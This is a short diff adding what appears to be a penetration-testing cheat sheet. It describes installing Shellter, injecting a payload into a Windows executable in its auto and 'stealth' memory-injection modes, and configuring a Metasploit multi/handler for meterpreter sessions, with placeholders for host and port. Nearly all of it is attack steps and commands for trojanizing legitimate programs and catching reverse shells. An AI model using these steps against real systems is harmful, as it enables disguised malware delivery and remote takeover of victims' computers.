@@ -1,0 +1,21 @@
+Shellter can be installed by running
+sudo apt-get install shellter
+
+1) EASY AUTO Payload Injection
+
+1.  Auto
+2.  Select Binary ( download 32bit exe or select from /usr/share/windows-binaries )
+3.  Shellter will go through the instructions then allow you to choose a payload
+4.  Can use stealth mode for memory injection
+5.  Select L and then payload option
+
+2) Using meterpreter payloads
+
+use exploit/multi/handler
+set payload windows/meterpreter/{{ payload }}
+set lhost {{ IP }}
+set lport {{ Port }}
+set exitonsession false
+exploit -j -z
+
+
